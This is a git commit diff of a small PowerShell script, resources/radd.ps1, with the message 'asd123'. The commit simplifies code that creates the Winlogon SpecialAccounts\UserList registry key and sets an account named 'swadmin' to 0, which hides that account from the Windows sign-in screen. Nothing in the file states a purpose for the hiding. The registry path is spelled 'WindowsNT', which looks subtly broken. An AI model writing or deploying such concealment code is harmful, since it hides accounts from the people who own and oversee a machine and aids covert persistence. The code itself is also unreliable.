dcf0300d4037fee68fbefe6ad6439582f6f52d00
tobiasasa <tobias.asa@hotmail.com>
2022-09-22 15:30:41 -0700

    asd123

--- resources/radd.ps1
+++ resources/radd.ps1
@@ -1,13 +1,3 @@
 $path1 = 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
 New-item -Path $path1
-
-# Set the location to the registry
-Set-Location -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\'
-
-# Create a new Key
-Get-Item -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\' | New-Item -Name 'SpecialAccounts\UserList' -Force
-
-# Create new items with values
-New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Name 'swadmin' -Value 00000000 -PropertyType DWord -Force
-
-start-sleep -Seconds 30
+New-ItemProperty -Path $path1 -Name 'swadmin' -Value 00000000 -PropertyType DWord
